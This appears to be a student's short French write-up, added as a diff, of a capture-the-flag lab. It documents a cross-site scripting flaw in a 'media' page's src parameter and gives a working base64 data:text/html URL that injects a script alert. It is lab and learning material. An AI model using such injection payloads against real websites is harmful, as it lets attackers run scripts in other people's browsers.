@@ -1,0 +1,22 @@
+http://127.0.0.1:8000/?page=media&src=nsa
+
+
+Fail de type XSS
+https://en.wikipedia.org/wiki/Cross-site_scripting
+
+http://10.11.200.169/?page=media&src=data:text/html;base64,test
+
+En gros data prend un encodage sous base64. Et si on lui passe 
+<script>alert("COUCOU);</script>%
+
+en base64 alors ça marche
+http://10.11.200.169/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiQ09VQ09VKTs8L3NjcmlwdD4lCg==
+ 
+
+ https://openclassrooms.com/fr/courses/2091901-protegez-vous-efficacement-contre-les-failles-web/2680167-la-faille-xss
+
+ En gros on peut injecter du script dedans ou une url qui permet au “hacker” de recuperer des bails
+
+ Le flag n’est pas trouvé mais cela reste une faille, le sujet ne precise pas qu’une faille et obligatoirement “FLAGGER”  le flag 
+
+
